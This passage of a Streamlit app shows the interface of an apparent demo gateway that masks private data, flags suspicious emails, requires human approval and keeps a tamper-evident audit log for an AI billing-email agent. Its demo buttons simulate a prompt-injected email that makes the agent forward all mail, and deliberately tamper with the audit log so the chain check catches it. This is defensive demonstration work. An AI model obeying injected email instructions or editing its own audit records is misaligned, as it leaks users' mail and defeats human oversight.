        bad = [v for v in {v["id"]: v for v in gw.views}.values() if v["flags"]]
        st.markdown("**Suspicious emails caught**")
        if not bad:
            st.caption("None flagged.")
        for v in bad[:4]:
            st.markdown(f"<div class='src'>{html.escape(str(v.get('subject', '')))}</div>" + chips(v["flags"]),
                        unsafe_allow_html=True)


def page_inbox():
    views = {v["id"]: v for v in gw.views}
    st.subheader(f"Billing emails Sentinel read ({len(views)})")
    st.caption("Only billing-related emails are read. Private details are masked before the AI sees them.")
    if not views:
        st.info("Nothing yet. Click 'Scan inbox' in the sidebar.")
    for v in views.values():
        with st.container(border=True):
            c1, c2 = st.columns([5, 2])
            c1.markdown(f"**{v.get('subject', '')}**")
            c1.caption(f"{v.get('sender', '')} · {v.get('date', '')} · {v.get('source', 'gmail')}")
            if v["flags"]:
                c1.warning("⚠️ Suspicious email: " + ", ".join(v["flags"]))
            if c2.button("🤖 Simulate: agent obeys this email", key=f"atk_{v['id']}"):
                simulate_attack()


def page_queue():
    pending = approvals.list_all("pending")
    st.subheader(f"Waiting for your approval ({len(pending)})")
    if not pending:
        st.info("Nothing pending. Click 'Scan inbox' in the sidebar.")
    for p in pending:
        with st.container(border=True):
            st.markdown(f"**{p.title}**")
            if p.flags:
                st.markdown(chips(p.flags), unsafe_allow_html=True)
            if p.source_snippet:
                st.markdown(f"<div class='src'>Source proof: “{html.escape(p.source_snippet)}”</div>",
                            unsafe_allow_html=True)
            edits = {}
            if p.kind == "draft":
                edits["to"] = st.text_input("To", p.details.get("to", ""), key=f"to_{p.id}")
                edits["subject"] = st.text_input("Subject", p.details.get("subject", ""), key=f"sub_{p.id}")
                edits["body"] = st.text_area("Body", p.details.get("body", ""), key=f"body_{p.id}", height=140)
            elif p.kind == "reminder":
                edits["title"] = st.text_input("Event title", p.details.get("title", ""), key=f"et_{p.id}")
                d = st.date_input("Reminder date", datetime.fromisoformat(p.details["start"]).date(), key=f"dt_{p.id}")
                base = datetime.combine(d, datetime.min.time()).replace(hour=10)
                edits["start"] = base.isoformat()
                edits["end"] = (base + timedelta(minutes=30)).isoformat()
            else:
                st.json(p.details)
            c1, c2, _ = st.columns([1, 1, 4])
            if c1.button("Approve", key=f"ap_{p.id}", type="primary"):
                res = run(approvals.approve(gw, p.id, edits or None))
                if res["status"] == "ok":
                    flash("success", f"Approved: {p.title}")
                else:
                    flash("error", res.get("reason", "Could not approve"))
            if c2.button("Reject", key=f"rj_{p.id}"):
                approvals.reject(p.id)
                flash("info", f"Rejected: {p.title}")

    with st.expander("➕ Add my own reminder"):
        t = st.text_input("What?", key="m_title")
        d = st.date_input("When?", key="m_date")
        if st.button("Add to queue"):
            if t.strip():
                base = datetime.combine(d, datetime.min.time()).replace(hour=10)
                approvals.add(Proposal(
                    id=f"manual-{int(datetime.now().timestamp())}", kind="reminder",
                    title=f"My reminder: {t.strip()}",
                    details={"title": t.strip(), "start": base.isoformat(),
                             "end": (base + timedelta(minutes=30)).isoformat(), "description": "Added by you"},
                    flags=["added_by_you"]))
                st.rerun()

    approved = approvals.list_all("approved")
    st.subheader(f"Approved ({len(approved)})")
    for p in approved:
        a, b = st.columns([5, 1])
        a.write(f"✔️ {p.title}")
        if b.button("Undo", key=f"un_{p.id}"):
            res = run(approvals.undo(gw, p.id))
            if res["status"] == "ok":
                flash("success", f"Undone: {p.title}")
            else:
                flash("error", res.get("reason", "Could not undo"))

    history = [p for p in approvals.list_all() if p.status in ("rejected", "undone")]
    if history:
        with st.expander(f"History ({len(history)})"):
            for p in history:
                st.write(f"{p.status.upper()}: {p.title}")


def page_timeline():
    subs = storage.list_subscriptions()
    if not subs:
        st.info("No subscriptions yet. Click 'Scan inbox'.")
        return
    df = pd.DataFrame([s.model_dump() for s in subs])
    df["renewal_date"] = df["renewal_date"].fillna("")
    latest = df.sort_values("renewal_date").groupby("merchant", as_index=False).last()
    m1, m2, m3 = st.columns(3)
    m1.metric("Monthly total (active plans)", f"Rs. {latest[latest.status == 'active'].amount.sum():g}")
    m2.metric("Free trials about to convert", int((latest.status == "trial").sum()))
    m3.metric("Price hikes caught", int(df["flags"].apply(lambda f: "price_hike" in f).sum()))
    for _, r in df[df["old_amount"].notna()].iterrows():
        st.warning(f"{r.merchant}: Rs. {r.old_amount:g} → Rs. {r.amount:g} from {r.renewal_date or 'next bill'}")
    plot = latest[latest.renewal_date != ""]
    if not plot.empty:
        fig = px.bar(plot, x="renewal_date", y="amount", color="merchant", text="amount",
                     labels={"renewal_date": "Renewal date", "amount": "Amount (Rs.)"},
                     color_discrete_sequence=["#12392E", "#E8472B", "#2E8B57", "#8A5A44", "#5B6B63", "#B8860B"])
        fig.update_layout(paper_bgcolor="rgba(0,0,0,0)", plot_bgcolor="rgba(0,0,0,0)",
                          font=dict(family="Instrument Sans, sans-serif", color="#10231D"))
        st.plotly_chart(fig)
    st.dataframe(df[["merchant", "amount", "status", "renewal_date", "old_amount", "flags", "source_snippet"]],
                 hide_index=True)


def masked_items(original, masked):
    """Pairs each placeholder in the masked text with the original value it replaced."""
    pat = r"\[[A-Z_]+_\d+\]"
    toks = re.findall(pat, masked or "")
    if not toks:
        return []
    vals = [None] * len(toks)
    if len(original or "") < 20000:
        parts = re.split(pat, masked)
        m = re.fullmatch("(.+?)".join(re.escape(x) for x in parts), original or "", re.S)
        if m:
            vals = list(m.groups())
    return list(zip(toks, vals))


def show_masked(original, masked):
    items = masked_items(original, masked)
    if not items:
        st.caption("Nothing was masked in this email.")
        return
    rows = "".join(
        f"<div class='mk'><span class='chip'>{html.escape(t.strip('[]').rsplit('_', 1)[0].replace('_', ' ').title())}</span>"
        f"<code>{html.escape(v.strip()[:80]) if v else 'hidden'}</code> → <span class='tg'>{html.escape(t)}</span></div>"
        for t, v in items)
    st.markdown(f"<div class='mkw'><b>What ControlHub hid from the AI ({len(items)})</b>{rows}</div>",
                unsafe_allow_html=True)


def page_ai_saw():
    st.subheader("Exactly what the AI received")
    st.caption("Left: what Gmail returned. Right: what ControlHub sent to the AI after cleaning and masking. "
               "Drag the slider to compare.")
    if REDACTOR_IS_STUB:
        st.warning("The real redactor is not loaded, so private details are not masked here.")
    views = {v["id"]: v for v in gw.views}
    if not views:
        st.info("Nothing yet. Click 'Scan inbox'.")
    for v in views.values():
        flagged = " ⚠️ " + ", ".join(v["flags"]) if v["flags"] else ""
        with st.expander(f"{v.get('subject') or v['id']}{flagged}"):
            t1, t2 = st.tabs(["Slide to compare", "Side by side"])
            with t1:
                compare_view(v["original"], v["masked"])
                show_masked(v["original"], v["masked"])
            with t2:
                left, right = st.columns(2)
                left.caption("Original")
                left.code(v["original"], language=None)
                right.caption("Sent to the AI")
                right.code(v["masked"], language=None)


def page_audit():
    st.subheader("Tamper-evident audit log")
    if st.button("Verify log"):
        ok, bad = audit.verify_chain()
        if ok:
            popup("✅ Log verified", "success", ["Every entry links to the one before it. Nothing has been changed."])
        else:
            popup("🚨 Tampering detected", "error", [
                f"The chain is broken at entry #{bad}.",
                "Someone edited the history. Every later entry no longer matches.",
            ])
    entries = audit.list_entries(200)
    if entries:
        st.dataframe(pd.DataFrame(entries)[["id", "ts", "actor", "action", "tool", "decision", "detail"]],
                     hide_index=True)
    else:
        st.info("No entries yet.")
    st.divider()
    st.markdown("**🎬 Demo tools**")
    c1, c2, c3 = st.columns(3)
    if c1.button("Simulate attack: forward all mail"):
        simulate_attack()
    if c2.button("Tamper with the first log entry"):
        c = sqlite3.connect(audit.DB_PATH)
        c.execute("UPDATE audit SET detail='tampered' WHERE id=(SELECT MIN(id) FROM audit)")
        c.commit()
        c.close()
        popup("Entry edited", "warning", ["The first log entry was changed. Now click 'Verify log'."])
    if c3.button("Reset audit log"):
        audit.DB_PATH.unlink(missing_ok=True)
        flash("success", "Audit log reset.")


# ====================== Main app ======================
def main_app():
    sidebar()
    crumb = ss.page.split(" ", 1)[-1]
    mode = "Local backend · demo" if os.getenv("FAKE_MODE", "1") == "1" else "Live Google data"
    st.markdown(
        f"<div class='tb'><div class='crumb'>Workspace &nbsp;/&nbsp; <b>{html.escape(crumb)}</b></div>"
        f"<div><span class='pill'><i></i>{mode}</span><span class='av'>{html.escape(ss.user[:2].upper())}</span></div></div>",
        unsafe_allow_html=True,
    )

    if ss.pop("auto_scan", False):
        with st.status("Reading your inbox through ControlHub...", expanded=True) as status:
            st.write("🔐 Connecting to Gmail with read-only access")
            r = run(run_scan(gw))
            if r["status"] == "ok":
                n = len({v["id"] for v in gw.views})
                bad = len([v for v in {v["id"]: v for v in gw.views}.values() if v["flags"]])
                hikes = sum(1 for s in r["subscriptions"] if "price_hike" in s.flags)
                st.write(f"📨 Read {n} billing emails")
                st.write("🧹 Removed hidden content and masked private details")
                st.write(f"🔎 Found {len(r['subscriptions'])} subscriptions, {hikes} price hike(s)")
                if bad:
                    st.write(f"⚠️ Flagged {bad} suspicious email(s)")
                st.write(f"📝 Prepared {len(r['proposals'])} proposals for your approval")
                status.update(label="Inbox scanned", state="complete", expanded=False)
            else:
                status.update(label="Scan failed", state="error")
                st.error(r.get("reason", "Scan failed"))

    if "flash" in ss:
        kind, msg = ss.pop("flash")
        getattr(st, kind)(msg)

    {
        PAGES[0]: page_home,
        PAGES[1]: page_dashboard,
        PAGES[2]: page_inbox,
        PAGES[3]: page_queue,
        PAGES[4]: page_timeline,
        PAGES[5]: page_ai_saw,
        PAGES[6]: page_audit,
    }[ss.page]()


# ====================== Router ======================
if ss.stage != "app":
    st.markdown(HIDE_SIDEBAR, unsafe_allow_html=True)

if ss.stage == "landing":
    landing()
elif ss.stage == "login":
    login()
elif ss.stage == "consent":
    consent()
else:
    main_app()
